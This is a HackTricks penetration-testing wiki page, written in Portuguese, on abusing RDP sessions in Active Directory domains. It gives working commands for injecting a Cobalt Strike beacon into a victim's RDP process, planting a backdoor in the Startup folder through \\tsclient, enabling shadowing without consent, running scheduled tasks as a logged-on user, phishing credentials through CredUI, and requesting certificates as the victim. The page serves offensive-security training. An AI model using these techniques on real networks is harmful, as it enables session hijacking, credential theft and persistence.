# Abuso de Sessões RDP

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

Se o **grupo externo** tiver **RDP access** a qualquer **computador** no domínio atual, um **atacante** poderia **comprometer esse computador e esperar por ele**.

Uma vez que esse usuário tenha acessado via RDP, o **atacante pode pivotar para a sessão desse usuário** e abusar de suas permissões no domínio externo.
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
Consulte **outras maneiras de roubar sessões com outras ferramentas** [**nesta página.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

Se um usuário acessar via **RDP into a machine** onde um **attacker** está **waiting** por ele, o **attacker** será capaz de **inject a beacon in the RDP session of the user**, e se o **victim mounted his drive** ao acessar por RDP, o **attacker could access it**.

Nesse caso você poderia simplesmente **compromise** o **victims** **original computer** escrevendo um **backdoor** na **statup folder**.
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

Se você for **local admin** em um host onde a vítima já tem uma **active RDP session**, talvez consiga **view/control that desktop without stealing the password or dumping LSASS**.

Isso depende da política **Remote Desktop Services shadowing** armazenada em:
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
Valores interessantes:

- `0`: Desabilitado
- `1`: `EnableInputNotify` (controle, aprovação do usuário necessária)
- `2`: `EnableInputNoNotify` (controle, **sem aprovação do usuário**)
- `3`: `EnableNoInputNotify` (somente visualização, aprovação do usuário necessária)
- `4`: `EnableNoInputNoNotify` (somente visualização, **sem aprovação do usuário**)
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
Isso é especialmente útil quando um usuário privilegiado conectado via RDP deixou a área de trabalho desbloqueada, sessão do KeePass, console MMC, sessão do navegador ou admin shell abertos.

## Scheduled Tasks como usuário logado

Se você é **local admin** e o usuário-alvo está **atualmente logado**, o Task Scheduler pode iniciar código **como esse usuário sem a senha dele**.

Isso transforma a sessão de logon existente da vítima em um primitivo de execução:
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
Notas:

- Se o usuário **não estiver logado**, o Windows geralmente exige a senha para criar uma tarefa que seja executada como ele.
- Se o usuário **estiver logado**, a tarefa pode reutilizar o contexto de logon existente.
- Esta é uma forma prática de executar ações de GUI ou iniciar binários dentro da sessão da vítima sem tocar no LSASS.

## Abuso do Prompt CredUI na Sessão da Vítima

Uma vez que você consiga executar **dentro da área de trabalho interativa da vítima** (por exemplo via **Shadow RDP** ou **uma tarefa agendada executando como esse usuário**), você pode exibir um **prompt de credenciais do Windows real** usando as APIs CredUI e capturar as credenciais inseridas pela vítima.

APIs relevantes:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Fluxo típico:

1. Iniciar um binário na sessão da vítima.
2. Exibir um prompt de autenticação de domínio que combine com a identidade visual do domínio atual.
3. Desempacotar o buffer de autenticação retornado.
4. Validar as credenciais fornecidas e, opcionalmente, continuar solicitando até que credenciais válidas sejam inseridas.

Isso é útil para **on-host phishing** porque o prompt é renderizado pelas APIs padrão do Windows em vez de um formulário HTML falso.

## Requisitando um PFX no Contexto da Vítima

A mesma primitiva **scheduled-task-as-user** pode ser usada para solicitar um **certificado/PFX como a vítima logada**. Esse certificado pode depois ser usado para **AD authentication** como esse usuário, evitando completamente o roubo de senha.

Fluxo de alto nível:

1. Obter **local admin** em um host onde a vítima está logada.
2. Executar a lógica de inscrição/exportação como a vítima usando uma **tarefa agendada**.
3. Exportar o **PFX** resultante.
4. Usar o PFX para PKINIT / autenticação AD baseada em certificado.

See the AD CS pages for follow-up abuse:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
